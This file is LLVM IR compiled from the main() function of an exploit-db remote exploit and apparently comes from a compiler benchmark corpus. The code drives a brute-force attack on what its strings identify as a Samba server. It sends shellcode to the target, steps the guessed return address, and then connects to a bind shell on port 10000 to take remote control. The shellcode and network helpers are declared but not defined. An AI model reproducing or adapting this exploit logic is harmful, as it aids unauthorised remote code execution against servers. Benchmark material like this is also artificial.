; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22468.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22468.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i8* }

@__const.main.tg_host = private unnamed_addr constant [130 x i8] c"localhost\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@plat = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [18 x i8] c"H:h:S:s:T:t:IiB:b\00", align 1
@optarg = external dso_local global i8*, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c" Try `%s -i' for more information.\0A\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [57 x i8] c" **\0A ** OK, It's good selection, Attack tries %d times.\0A\00", align 1
@BRUTE_AT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [69 x i8] c" ** If work process is boring, drink coffee and wait. hehe ;-D\0A **\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c" [*] Brute-Force mode:\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c" |----+----+----+----+----+----+----+----+----+----+----+----+----|\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"\0A |\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@ATK_PORT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [4 x i8] c"|\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [23 x i8] c" [-] Connect Failed.\0A\0A\00", align 1
@SH_PORT = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [28 x i8] c" [+] Shellcode address: %p\0A\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c" [*] Brute-Force end !!\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [39 x i8] c" **\0A ** Bind shellcode is port 10000.\0A\00", align 1
@.str.13 = private unnamed_addr constant [72 x i8] c" ** If bindshell port number was changed, change connection port.\0A **\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"|\0A\0A **\0A\00", align 1
@.str.15 = private unnamed_addr constant [55 x i8] c" ** Brute-Force exploit failed. Reason is simple.\0A **\0A\00", align 1
@.str.16 = private unnamed_addr constant [60 x i8] c" ** Could not search shellcode's position during %d times.\0A\00", align 1
@.str.17 = private unnamed_addr constant [57 x i8] c" ** Or, Operating System's target that we attack isn't.\0A\00", align 1
@.str.18 = private unnamed_addr constant [54 x i8] c" ** OOops ! is server Samba version doubtful ??\0A **\0A\0A\00", align 1
@.str.19 = private unnamed_addr constant [17 x i8] c" [0] Target: %s\0A\00", align 1
@.str.20 = private unnamed_addr constant [18 x i8] c" [1] Set socket.\0A\00", align 1
@.str.21 = private unnamed_addr constant [36 x i8] c" [2] Make shellcode & Send Packet.\0A\00", align 1
@.str.22 = private unnamed_addr constant [20 x i8] c" [3] Trying %s:%d.\0A\00", align 1
@.str.23 = private unnamed_addr constant [26 x i8] c" [*] Connected to %s:%d.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [130 x i8], align 16
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %12 = bitcast [130 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([130 x i8], [130 x i8]* @__const.main.tg_host, i32 0, i32 0), i64 130, i1 false)
  %13 = load %struct.TYPE_2__*, %struct.TYPE_2__** @plat, align 8
  %14 = load i32, i32* %8, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %13, i64 %15
  %17 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 8
  store i32 %18, i32* %11, align 4
  %19 = call i32 (...) @banrl()
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %22, label %27

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @usage(i8* %25)
  br label %27

27:                                               ; preds = %22, %2
  br label %28

28:                                               ; preds = %76, %27
  %29 = load i32, i32* %4, align 4
  %30 = load i8**, i8*** %5, align 8
  %31 = call i32 @getopt(i32 %29, i8** %30, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  store i32 %31, i32* %7, align 4
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %33, label %77

33:                                               ; preds = %28
  %34 = load i32, i32* %7, align 4
  switch i32 %34, label %76 [
    i32 72, label %35
    i32 104, label %35
    i32 83, label %41
    i32 115, label %41
    i32 84, label %44
    i32 116, label %44
    i32 73, label %61
    i32 105, label %61
    i32 66, label %66
    i32 98, label %66
    i32 63, label %69
  ]

35:                                               ; preds = %33, %33
  %36 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %37 = call i32 @memset(i8* %36, i32 0, i32 130)
  %38 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %39 = load i8*, i8** @optarg, align 8
  %40 = call i32 @strncpy(i8* %38, i8* %39, i32 129)
  br label %76

41:                                               ; preds = %33, %33
  %42 = load i8*, i8** @optarg, align 8
  %43 = call i32 @strtoul(i8* %42, i32 0, i32 0)
  store i32 %43, i32* %11, align 4
  br label %76

44:                                               ; preds = %33, %33
  %45 = load i8*, i8** @optarg, align 8
  %46 = call i32 @atoi(i8* %45)
  store i32 %46, i32* %8, align 4
  %47 = icmp sgt i32 %46, 1
  br i1 %47, label %48, label %53

48:                                               ; preds = %44
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @usage(i8* %51)
  br label %60

53:                                               ; preds = %44
  %54 = load %struct.TYPE_2__*, %struct.TYPE_2__** @plat, align 8
  %55 = load i32, i32* %8, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i64 %56
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 8
  store i32 %59, i32* %11, align 4
  br label %60

60:                                               ; preds = %53, %48
  br label %76

61:                                               ; preds = %33, %33
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @usage(i8* %64)
  br label %76

66:                                               ; preds = %33, %33
  %67 = load i32, i32* %9, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %9, align 4
  br label %76

69:                                               ; preds = %33
  %70 = load i32, i32* @stderr, align 4
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 0
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i8* %73)
  %75 = call i32 @exit(i32 -1) #4
  unreachable

76:                                               ; preds = %33, %66, %61, %60, %41, %35
  br label %28

77:                                               ; preds = %28
  %78 = load i32, i32* %9, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %187

80:                                               ; preds = %77
  %81 = load i32, i32* @stdout, align 4
  %82 = load i32, i32* @BRUTE_AT, align 4
  %83 = call i32 (i32, i8*, ...) @fprintf(i32 %81, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.2, i64 0, i64 0), i32 %82)
  %84 = load i32, i32* @stdout, align 4
  %85 = call i32 (i32, i8*, ...) @fprintf(i32 %84, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.3, i64 0, i64 0))
  %86 = load i32, i32* @stdout, align 4
  %87 = call i32 (i32, i8*, ...) @fprintf(i32 %86, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0))
  %88 = load i32, i32* @stdout, align 4
  %89 = call i32 (i32, i8*, ...) @fprintf(i32 %88, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i64 0, i64 0))
  %90 = load i32, i32* @stdout, align 4
  %91 = call i32 (i32, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %92

92:                                               ; preds = %171, %80
  %93 = load i32, i32* %9, align 4
  %94 = load i32, i32* @BRUTE_AT, align 4
  %95 = icmp slt i32 %93, %94
  br i1 %95, label %96, label %174

96:                                               ; preds = %92
  %97 = load i32, i32* @stdout, align 4
  %98 = call i32 @fflush(i32 %97)
  %99 = load i32, i32* @stdout, align 4
  %100 = call i32 (i32, i8*, ...) @fprintf(i32 %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %101 = load i32, i32* %11, align 4
  %102 = add nsw i32 %101, 256
  store i32 %102, i32* %11, align 4
  %103 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %104 = load i32, i32* @ATK_PORT, align 4
  %105 = call i64 @setsock(i8* %103, i32 %104)
  %106 = trunc i64 %105 to i32
  store i32 %106, i32* %6, align 4
  %107 = load i32, i32* %6, align 4
  %108 = call i64 @re_connt(i32 %107, i32 0)
  %109 = trunc i64 %108 to i32
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %129

111:                                              ; preds = %96
  br label %112

112:                                              ; preds = %118, %111
  %113 = load i32, i32* %9, align 4
  %114 = load i32, i32* @BRUTE_AT, align 4
  %115 = sub nsw i32 %114, 1
  %116 = icmp sge i32 %113, %115
  %117 = xor i1 %116, true
  br i1 %117, label %118, label %123

118:                                              ; preds = %112
  %119 = load i32, i32* @stdout, align 4
  %120 = call i32 (i32, i8*, ...) @fprintf(i32 %119, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %121 = load i32, i32* %9, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %9, align 4
  br label %112

123:                                              ; preds = %112
  %124 = load i32, i32* @stdout, align 4
  %125 = call i32 (i32, i8*, ...) @fprintf(i32 %124, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  %126 = load i32, i32* @stderr, align 4
  %127 = call i32 (i32, i8*, ...) @fprintf(i32 %126, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.9, i64 0, i64 0))
  %128 = call i32 @exit(i32 -1) #4
  unreachable

129:                                              ; preds = %96
  %130 = load i32, i32* %6, align 4
  %131 = load i32, i32* %11, align 4
  %132 = call i32 @__atk_code_send_recv(i32 %130, i32 %131)
  %133 = load i32, i32* %6, align 4
  %134 = call i32 @close(i32 %133)
  %135 = call i32 @sleep(i32 2)
  %136 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %137 = load i32, i32* @SH_PORT, align 4
  %138 = call i64 @setsock(i8* %136, i32 %137)
  %139 = trunc i64 %138 to i32
  store i32 %139, i32* %6, align 4
  %140 = load i32, i32* %6, align 4
  %141 = call i64 @re_connt(i32 %140, i32 0)
  %142 = trunc i64 %141 to i32
  %143 = icmp eq i32 %142, -1
  br i1 %143, label %144, label %145

144:                                              ; preds = %129
  br label %171

145:                                              ; preds = %129
  br label %146

146:                                              ; preds = %152, %145
  %147 = load i32, i32* %9, align 4
  %148 = load i32, i32* @BRUTE_AT, align 4
  %149 = sub nsw i32 %148, 1
  %150 = icmp sge i32 %147, %149
  %151 = xor i1 %150, true
  br i1 %151, label %152, label %157

152:                                              ; preds = %146
  %153 = load i32, i32* @stdout, align 4
  %154 = call i32 (i32, i8*, ...) @fprintf(i32 %153, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %155 = load i32, i32* %9, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %9, align 4
  br label %146

157:                                              ; preds = %146
  %158 = load i32, i32* @stdout, align 4
  %159 = call i32 (i32, i8*, ...) @fprintf(i32 %158, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  %160 = load i32, i32* @stdout, align 4
  %161 = load i32, i32* %11, align 4
  %162 = call i32 (i32, i8*, ...) @fprintf(i32 %160, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0), i32 %161)
  %163 = load i32, i32* @stdout, align 4
  %164 = call i32 (i32, i8*, ...) @fprintf(i32 %163, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0))
  %165 = load i32, i32* @stdout, align 4
  %166 = call i32 (i32, i8*, ...) @fprintf(i32 %165, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.12, i64 0, i64 0))
  %167 = load i32, i32* @stdout, align 4
  %168 = call i32 (i32, i8*, ...) @fprintf(i32 %167, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.13, i64 0, i64 0))
  %169 = load i32, i32* %6, align 4
  %170 = call i32 @send_recv_sh(i32 %169)
  br label %171

171:                                              ; preds = %157, %144
  %172 = load i32, i32* %9, align 4
  %173 = add nsw i32 %172, 1
  store i32 %173, i32* %9, align 4
  br label %92

174:                                              ; preds = %92
  %175 = load i32, i32* @stdout, align 4
  %176 = call i32 (i32, i8*, ...) @fprintf(i32 %175, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0))
  %177 = load i32, i32* @stdout, align 4
  %178 = call i32 (i32, i8*, ...) @fprintf(i32 %177, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.15, i64 0, i64 0))
  %179 = load i32, i32* @stdout, align 4
  %180 = load i32, i32* @BRUTE_AT, align 4
  %181 = call i32 (i32, i8*, ...) @fprintf(i32 %179, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.16, i64 0, i64 0), i32 %180)
  %182 = load i32, i32* @stdout, align 4
  %183 = call i32 (i32, i8*, ...) @fprintf(i32 %182, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.17, i64 0, i64 0))
  %184 = load i32, i32* @stdout, align 4
  %185 = call i32 (i32, i8*, ...) @fprintf(i32 %184, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.18, i64 0, i64 0))
  %186 = call i32 @exit(i32 -1) #4
  unreachable

187:                                              ; preds = %77
  %188 = load i32, i32* @stdout, align 4
  %189 = load %struct.TYPE_2__*, %struct.TYPE_2__** @plat, align 8
  %190 = load i32, i32* %8, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %189, i64 %191
  %193 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %192, i32 0, i32 1
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 (i32, i8*, ...) @fprintf(i32 %188, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.19, i64 0, i64 0), i8* %194)
  %196 = load i32, i32* @stdout, align 4
  %197 = call i32 (i32, i8*, ...) @fprintf(i32 %196, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.20, i64 0, i64 0))
  %198 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %199 = load i32, i32* @ATK_PORT, align 4
  %200 = call i64 @setsock(i8* %198, i32 %199)
  %201 = trunc i64 %200 to i32
  store i32 %201, i32* %6, align 4
  %202 = load i32, i32* %6, align 4
  %203 = call i64 @re_connt(i32 %202, i32 1)
  %204 = trunc i64 %203 to i32
  %205 = load i32, i32* @stdout, align 4
  %206 = call i32 (i32, i8*, ...) @fprintf(i32 %205, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.21, i64 0, i64 0))
  %207 = load i32, i32* %6, align 4
  %208 = load i32, i32* %11, align 4
  %209 = call i32 @__atk_code_send_recv(i32 %207, i32 %208)
  %210 = load i32, i32* %6, align 4
  %211 = call i32 @close(i32 %210)
  %212 = load i32, i32* @stdout, align 4
  %213 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %214 = load i32, i32* @SH_PORT, align 4
  %215 = call i32 (i32, i8*, ...) @fprintf(i32 %212, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.22, i64 0, i64 0), i8* %213, i32 %214)
  %216 = call i32 @sleep(i32 2)
  %217 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %218 = load i32, i32* @SH_PORT, align 4
  %219 = call i64 @setsock(i8* %217, i32 %218)
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %6, align 4
  %221 = load i32, i32* %6, align 4
  %222 = call i64 @re_connt(i32 %221, i32 1)
  %223 = trunc i64 %222 to i32
  %224 = load i32, i32* @stdout, align 4
  %225 = getelementptr inbounds [130 x i8], [130 x i8]* %10, i64 0, i64 0
  %226 = load i32, i32* @SH_PORT, align 4
  %227 = call i32 (i32, i8*, ...) @fprintf(i32 %224, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.23, i64 0, i64 0), i8* %225, i32 %226)
  %228 = load i32, i32* %6, align 4
  %229 = call i32 @send_recv_sh(i32 %228)
  br label %230

230:                                              ; preds = %187
  %231 = load i32, i32* %3, align 4
  ret i32 %231
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @banrl(...) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @strtoul(i8*, i32, i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @fflush(i32) #2

declare dso_local i64 @setsock(i8*, i32) #2

declare dso_local i64 @re_connt(i32, i32) #2

declare dso_local i32 @__atk_code_send_recv(i32, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @send_recv_sh(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
